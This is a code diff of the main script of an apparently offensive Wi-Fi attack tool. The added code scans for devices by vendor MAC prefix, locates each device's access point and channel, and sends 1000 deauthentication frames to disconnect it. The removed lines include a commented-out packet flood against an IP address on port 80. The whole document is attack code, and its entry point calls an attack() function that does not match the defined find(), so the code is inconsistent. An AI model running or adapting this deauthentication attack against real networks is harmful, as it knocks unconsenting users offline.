@@ -1,36 +1,39 @@
 #!/usr/bin/python3
 
 """Main module for packet analyzation attack."""
-from device_analyzer import DeviceAnalyzer
-from channel_analyzer import ChannelAnalyzer
-from packet_analyzer import PacketAnalyzer
-from interface_manager import InterfaceManager
-from denial_of_service import DenialOfService
+from modules.device_analyzer import DeviceAnalyzer
+from modules.wireless_traffic_analyzer import WirelessTrafficAnalyzer
+from modules.interface_manager import InterfaceManager
+from modules.denial_of_service import DenialOfService
 
 
-def analyze_devices(interface, vendor=None):
-    print(f'[INFO]',
-          f'Analyzing devices...',
-          f'[vendor: {vendor}, interface: {interface}]')
-    analyzer = DeviceAnalyzer(interface)
-    analyzer.get_devices(vendor)
+def find(interface, vendor=None):
+    analyzer = WirelessTrafficAnalyzer(interface, 10)
+    devices = analyzer.get_devices(vendor)
+    try:
+        device = devices[6][0]
+    except IndexError as error:
+        print(f'[WARNING]',
+              f'No device found for vendor {vendor}...')
+        return
 
+    aps = analyzer.get_aps(device)
+    try:
+        ap = aps[6][0]
+    except IndexError as error:
+        print(f'[WARNING]',
+              f'No AP found for device {device}...')
+        return
 
-def analyze_channels(target, interface):
-    print(f'[INFO]',
-          f'Analyzing channels...',
-          f'[target: {target}, interface: {interface}]')
-    analyzer = ChannelAnalyzer(target, interface)
-    analyzer.get_most_active_channel()
+    device_analyzer = DeviceAnalyzer(device, interface)
+    channel = device_analyzer.get_channels()
 
+    device_analyzer.visualize_packets(channel)
 
-def analyze_packets(target, interface, channel, interval, length):
-    print(f'[INFO]',
-          f'Analyzing packets...',
-          f'[target: {target}, interface: {interface}, channel {channel}',
-          f' interval: {interval}, length: {length}]')
-    pk_anal = PacketAnalyzer(target, interface, channel, interval, length)
-    pk_anal.start()
+    dos = DenialOfService(interface, channel)
+    dos.deauth(device, ap, 1000)
+
+    return True
 
 
 if __name__ == '__main__':
@@ -38,22 +41,4 @@ if __name__ == '__main__':
     interface = "wlan0"
     vendor = "64:16:66"
 
-    # analyze_devices(interface, vendor)
-
-    target = "64:16:66:xx:xx:xx"
-
-    # analyze_channels(target, interface)
-
-    channel = 6
-    length = 60
-    interval = 0.2
-
-    # analyze_channels(target, interface, channel, interval, length)
-
-    dos = DenialOfService(interface, channel)
-
-    target_addr = '192.168.0.x'
-    quantity = 100000
-    target_port = 80
-
-    # dos.flood(target_addr, quantity, target_port)
+    attack(interface, vendor)
